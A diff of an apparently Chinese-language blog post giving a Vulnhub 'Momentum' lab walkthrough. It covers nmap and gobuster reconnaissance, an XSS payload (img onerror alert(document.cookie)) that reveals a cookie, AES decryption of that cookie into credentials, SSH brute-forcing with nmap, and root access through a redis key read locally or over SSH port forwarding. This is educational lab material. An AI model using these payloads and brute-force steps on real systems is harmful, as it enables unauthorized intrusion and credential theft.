@@ -71,6 +71,10 @@
             property="og:article:tag" 
             content="XSS">
         
+          <meta 
+            property="og:article:tag" 
+            content="redis">
+        
       
     
   
@@ -337,7 +341,7 @@
     
     
       <span class="dot"></span>
-      <span>865 words</span>
+      <span>1.3k words</span>
     
   </div>
   
@@ -384,6 +388,15 @@
             XSS
           </a>
         
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/redis/" 
+            class="post-meta-link">
+            redis
+          </a>
+        
       </div>
     </div>
   
@@ -395,39 +408,39 @@
 <p>不再赘述，可看之前的<strong>Vulnhub</strong>相关文章。  </p>
 </blockquote>
 <h2 id="1-_u4FE1_u606F_u6536_u96C6"><a href="#1-_u4FE1_u606F_u6536_u96C6" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><blockquote>
-<p>端口：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~]
-└─# nmap -A -p- 192.168.81.134     
-Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-05-25 02:27 CDT
-Nmap scan report for 192.168.81.134
-Host is up (0.00051s latency).
-Not shown: 65533 closed tcp ports (reset)
+<p>端口：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># nmap -A -p- 192.168.81.134     </span>
+Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2022</span>-05-25 02:27 CDT
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.81.134
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00051s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
 PORT   STATE SERVICE VERSION
-22&#x2F;tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 5c:8e:2c:cc:c1:b0:3e:7c:0e:22:34:d8:60:31:4e:62 (RSA)
-|   256 81:fd:c6:4c:5a:50:0a:27:ea:83:38:64:b9:8b:bd:c1 (ECDSA)
-|_  256 c1:8f:87:c1:52:09:27:60:5f:2e:2d:e0:08:03:72:c8 (ED25519)
-80&#x2F;tcp open  http    Apache httpd 2.4.38 ((Debian))
-|_http-title: Momentum | Index 
-|_http-server-header: Apache&#x2F;2.4.38 (Debian)
-MAC Address: 00:0C:29:3B:6D:A4 (VMware)
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.9p1 Debian <span class="token number">10</span>+deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">2048</span> 5c:8e:2c:cc:c1:b0:3e:7c:0e:22:34:d8:60:31:4e:62 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">81</span>:fd:c6:4c:5a:50:0a:27:ea:83:38:64:b9:8b:bd:c1 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> c1:8f:87:c1:52:09:27:60:5f:2e:2d:e0:08:03:72:c8 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.38 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
+<span class="token operator">|</span>_http-title: Momentum <span class="token operator">|</span> Index 
+<span class="token operator">|</span>_http-server-header: Apache/2.4.38 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
+MAC Address: 00:0C:29:3B:6D:A4 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
 Device type: general purpose
-Running: Linux 4.X|5.X
-OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5
-OS details: Linux 4.15 - 5.6
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>目录：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~]
-└─# gobuster dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -u http:&#x2F;&#x2F;192.168.81.134 -x php,html,txt
-......
-&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-2022&#x2F;05&#x2F;25 02:30:08 Starting gobuster in directory enumeration mode
-&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-&#x2F;index.html           (Status: 200) [Size: 2001]
-&#x2F;img                  (Status: 301) [Size: 314] [--&gt; http:&#x2F;&#x2F;192.168.81.134&#x2F;img&#x2F;]
-&#x2F;css                  (Status: 301) [Size: 314] [--&gt; http:&#x2F;&#x2F;192.168.81.134&#x2F;css&#x2F;]
-&#x2F;manual               (Status: 301) [Size: 317] [--&gt; http:&#x2F;&#x2F;192.168.81.134&#x2F;manual&#x2F;]
-&#x2F;js                   (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.81.134&#x2F;js&#x2F;]    
-......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.6</span>
+Network Distance: <span class="token number">1</span> hop
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>目录：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.81.134 -x php,html,txt</span>
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token number">2022</span>/05/25 02:30:08 Starting gobuster <span class="token keyword">in</span> directory enumeration mode
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">2001</span><span class="token punctuation">]</span>
+/img                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">314</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.81.134/img/<span class="token punctuation">]</span>
+/css                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">314</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.81.134/css/<span class="token punctuation">]</span>
+/manual               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">317</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.81.134/manual/<span class="token punctuation">]</span>
+/js                   <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">313</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.81.134/js/<span class="token punctuation">]</span>    
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 </blockquote>
 <h2 id="2-getshell"><a href="#2-getshell" class="headerlink" title="2.getshell"></a>2.getshell</h2><blockquote>
 <p><code>/css</code> 和 <code>/manual</code> 没有发现什么敏感信息，<code>/index.html</code> 是 <code>img</code> 4张图片的展示界面。<br><code>/js</code> 下存在 <code>main.js</code> 访问得到 <strong>AES密钥 SecretPassphraseMomentum</strong> ：<br><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">viewDetails</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
@@ -439,42 +452,96 @@ Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel<span aria-hidden="t
 var CryptoJS = require("crypto-js");
 var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
 console.log(decrypted.toString(CryptoJS.enc.Utf8));
-*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>回到 <code>index.html</code> 点击图片，url重定向到 <code>opus-details.php?id= +str</code>。<br>使用 <code>/opus-details.php?id=&lt;img src=1 onerror=alert(document.cookie)&gt;</code> 获取 <strong>Cookie:U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt</strong> 。<br>将得到的 <strong>Cookie</strong> 作为密文，与 <strong>AES密钥</strong> 进行AES解密，得到字符串 <strong>auxerre-alienum##</strong>  。<br>80端口没有找可以登录的入口，故将解密得到的字符串拆解为用户名和密码字典：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Desktop]
-└─# cat db.txt       
-auxerre-alienum##
+*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>回到 <code>index.html</code> 点击图片，url重定向到 <code>opus-details.php?id= +str</code>。<br>使用 <code>/opus-details.php?id=&lt;img src=1 onerror=alert(document.cookie)&gt;</code> 获取 <strong>Cookie:U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt</strong> 。<br>将得到的 <strong>Cookie</strong> 作为密文，与 <strong>AES密钥</strong> 进行AES解密，得到字符串 <strong>auxerre-alienum##</strong>  。<br>80端口没有找可以登录的入口，故将解密得到的字符串拆解为用户名和密码字典：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># cat db.txt       </span>
+auxerre-alienum<span class="token comment">##</span>
 auxerre-alienum
 auxerre-
 auxerre
--alienum##
-alienum##
-alienum<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>使用 <code>nmap</code> 进行ssh爆破：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Desktop]
-└─# nmap -p 22 --script ssh-brute --script-args userdb&#x3D;name.txt,passdb&#x3D;passwd.txt 192.168.81.134
-Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-05-25 02:20 CDT
-NSE: [ssh-brute] Trying username&#x2F;password pair: auxerre-alienum##:auxerre-alienum##
-......
+-alienum<span class="token comment">##</span>
+alienum<span class="token comment">##</span>
+alienum<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>使用 <code>nmap</code> 进行ssh爆破：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># nmap -p 22 --script ssh-brute --script-args userdb=db.txt,passdb=db.txt 192.168.81.134</span>
+Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2022</span>-05-25 02:20 CDT
+NSE: <span class="token punctuation">[</span>ssh-brute<span class="token punctuation">]</span> Trying username/password pair: auxerre-alienum<span class="token comment">##:auxerre-alienum##</span>
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
 PORT   STATE SERVICE
-22&#x2F;tcp open  ssh
-| ssh-brute: 
-|   Accounts: 
-|     auxerre:auxerre-alienum## - Valid credentials
-|_  Statistics: Performed 43 guesses in 13 seconds, average tps: 3.3
-MAC Address: 00:0C:29:3B:6D:A4 (VMware)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>得到ssh账号密码 <strong>auxerre:auxerre-alienum##</strong>，成功ssh登录，并在当前用户目录下找到flag：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Desktop]
-└─# ssh &#39;auxerre&#39;@&#39;192.168.81.134&#39;
-......
-auxerre@Momentum:~$ id
-uid&#x3D;1000(auxerre) gid&#x3D;1000(auxerre) groups&#x3D;1000(auxerre),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
-auxerre@Momentum:~$ pwd
-&#x2F;home&#x2F;auxerre
-auxerre@Momentum:~$ ls -l
-total 4
--rwx------ 1 auxerre auxerre 146 Apr 22  2021 user.txt
-auxerre@Momentum:~$ cat user.txt
-[ Momentum - User Owned ]
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
+<span class="token operator">|</span> ssh-brute: 
+<span class="token operator">|</span>   Accounts: 
+<span class="token operator">|</span>     auxerre:auxerre-alienum<span class="token comment">## - Valid credentials</span>
+<span class="token operator">|</span>_  Statistics: Performed <span class="token number">43</span> guesses <span class="token keyword">in</span> <span class="token number">13</span> seconds, average tps: <span class="token number">3.3</span>
+MAC Address: 00:0C:29:3B:6D:A4 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>得到ssh账号密码 <strong>auxerre:auxerre-alienum##</strong>，成功ssh登录，并在当前用户目录下找到flag：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># ssh 'auxerre'@'192.168.81.134'</span>
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
+auxerre@Momentum:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>auxerre<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>auxerre<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>auxerre<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,109<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,111<span class="token punctuation">(</span>bluetooth<span class="token punctuation">)</span>
+auxerre@Momentum:~$ <span class="token builtin class-name">pwd</span>
+/home/auxerre
+auxerre@Momentum:~$ <span class="token function">ls</span> -l
+total <span class="token number">4</span>
+-rwx------ <span class="token number">1</span> auxerre auxerre <span class="token number">146</span> Apr <span class="token number">22</span>  <span class="token number">2021</span> user.txt
+auxerre@Momentum:~$ <span class="token function">cat</span> user.txt
+<span class="token punctuation">[</span> Momentum - User Owned <span class="token punctuation">]</span>
 ---------------------------------------
-flag : 84157165c30ad34d18945b647ec7f647
+flag <span class="token builtin class-name">:</span> 84157165c30ad34d18945b647ec7f647
 ---------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 </blockquote>
-<h2 id="3-_u63D0_u6743"><a href="#3-_u63D0_u6743" class="headerlink" title="3.提权"></a>3.提权</h2>
+<h2 id="3-_u63D0_u6743"><a href="#3-_u63D0_u6743" class="headerlink" title="3.提权"></a>3.提权</h2><blockquote>
+<p>查看系统用户表，看到存在用户 <code>redis</code> ：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxerre@Momentum:/$ <span class="token function">cat</span> /etc/passwd
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
+root:x:0:0:root:/root:/bin/bash
+auxerre:x:1000:1000:auxerre,,,:/home/auxerre:/bin/bash
+redis:x:107:115::/var/lib/redis:/usr/sbin/nologin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>无法使用sudo提权，不具有<strong>/etc/passwd</strong>文件的写权限，<strong>cat crontab</strong>没有可利用的定时任务。<br>查看系统当前启用端口 <code>ss -tunlp</code>(这里尝试用<strong>netstat</strong>，系统提示没有这个命令)：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxerre@Momentum:/$ ss -tunlp
+Netid        State         Recv-Q        Send-Q               Local Address:Port               Peer Address:Port       
+udp          UNCONN        <span class="token number">0</span>             <span class="token number">0</span>                          <span class="token number">0.0</span>.0.0:68                      <span class="token number">0.0</span>.0.0:*          
+tcp          LISTEN        <span class="token number">0</span>             <span class="token number">128</span>                        <span class="token number">0.0</span>.0.0:22                      <span class="token number">0.0</span>.0.0:*          
+tcp          LISTEN        <span class="token number">0</span>             <span class="token number">128</span>                      <span class="token number">127.0</span>.0.1:6379                    <span class="token number">0.0</span>.0.0:*          
+tcp          LISTEN        <span class="token number">0</span>             <span class="token number">128</span>                           <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22                         <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*          
+tcp          LISTEN        <span class="token number">0</span>             <span class="token number">128</span>                          <span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:6379                       <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*          
+tcp          LISTEN        <span class="token number">0</span>             <span class="token number">128</span>                              *:80                            *:*    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>发现系统当前启用了 <code>6379</code> 端口，查了一下是<strong>redis数据库</strong>的默认端口，结合之前发现的用户<code>redis</code>，这里猜测系统正在运行redis数据库，AUX查看当前系统进程确认：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxerre@Momentum:/$ <span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> <span class="token number">127.0</span>.0.1
+redis      <span class="token number">540</span>  <span class="token number">0.1</span>  <span class="token number">0.4</span>  <span class="token number">51672</span>  <span class="token number">9568</span> ?        Ssl  03:20   <span class="token number">0</span>:06 /usr/bin/redis-server <span class="token number">127.0</span>.0.1:6379
+auxerre    <span class="token number">917</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">6208</span>   <span class="token number">824</span> pts/0    S+   04:23   <span class="token number">0</span>:00 <span class="token function">grep</span> <span class="token number">127.0</span>.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><strong><em>（redis是非关系型数据库，数据是以键-值对的形式进行存储，没有传统的表）</em></strong><br>尝试本地登录redis，登录成功，查看所有的key，发现存在一个名称为<strong>rootpass</strong>的key，查看该key的值：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxerre@Momentum:/$  redis-cli //本地登录redis
+<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> keys * //查看所有key
+<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"rootpass"</span>
+<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> get rootpass //查看rootpass的值
+<span class="token string">"m0mentum-al1enum##"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>猜测<strong>rootpass</strong>的值为root的密码，直接在shell中su切换为root试试：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxerre@Momentum:/$ <span class="token function">su</span> -
+Password: 
+root@Momentum:~<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
+root@Momentum:~<span class="token comment"># pwd</span>
+/root
+root@Momentum:~<span class="token comment"># ls -a</span>
+<span class="token builtin class-name">.</span>  <span class="token punctuation">..</span>  .bash_history  .bashrc  .local  .profile  root.txt
+root@Momentum:~<span class="token comment"># cat root.txt</span>
+<span class="token punctuation">[</span> Momentum - Rooted <span class="token punctuation">]</span>
+---------------------------------------
+Flag <span class="token builtin class-name">:</span> 658ff660fdac0b079ea78238e5996e40
+---------------------------------------
+by alienum with <span class="token operator">&lt;</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>提权成功，并且找到flag。</p>
+</blockquote>
+<h2 id="4-_u5176_u4ED6"><a href="#4-_u5176_u4ED6" class="headerlink" title="4.其他"></a>4.其他</h2><blockquote>
+<p>如果系统没有给账户auxerre本地登录redis的权限，则考虑进行<strong>SSH端口转发</strong><br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/<span class="token punctuation">]</span> //本机7777端口映射到靶机6379
+└─<span class="token comment"># ssh -N -f -L 7777:127.0.0.1:6379 'auxerre'@'192.168.81.134'</span>
+auxerre@192.168.81.134's password: 
+                                                                                                                           
+┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/<span class="token punctuation">]</span> //本机的7777端口确认启用
+└─<span class="token comment"># netstat -tulpn            </span>
+Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.1:36271         <span class="token number">0.0</span>.0.0:*               LISTEN      <span class="token number">34959</span>/containerd    
+tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.1:7777          <span class="token number">0.0</span>.0.0:*               LISTEN      <span class="token number">122894</span>/ssh          
+tcp6       <span class="token number">0</span>      <span class="token number">0</span> ::1:7777                :::*                    LISTEN      <span class="token number">122894</span>/ssh          
+udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:68              <span class="token number">0.0</span>.0.0:*                           <span class="token number">3513</span>/dhclient 
+
+┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/<span class="token punctuation">]</span> //通过本机的7777端口登录靶机的redis数据库
+└─<span class="token comment"># redis-cli -h 127.0.0.1 -p 7777</span>
+<span class="token number">127.0</span>.0.1:777<span class="token operator"><span class="token file-descriptor important">7</span>></span> keys *
+<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"rootpass"</span>
+<span class="token number">127.0</span>.0.1:777<span class="token operator"><span class="token file-descriptor important">7</span>></span> get rootpass
+<span class="token string">"m0mentum-al1enum##"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+</blockquote>
+
   </div>
   <div>
     
@@ -530,7 +597,7 @@ flag : 84157165c30ad34d18945b647ec7f647
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-_u5176_u4ED6"><span class="toc-text">4.其他</span></a></li></ol>
 </div></main>
             <aside class="left-column">
               
@@ -561,7 +628,7 @@ flag : 84157165c30ad34d18945b647ec7f647
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>48</span>
+    <span>49</span>
     <span>Tags</span>
   </a>
 </div>
@@ -594,7 +661,7 @@ flag : 84157165c30ad34d18945b647ec7f647
     style="padding-right: 2px;">
   </i>TOC
 </div>
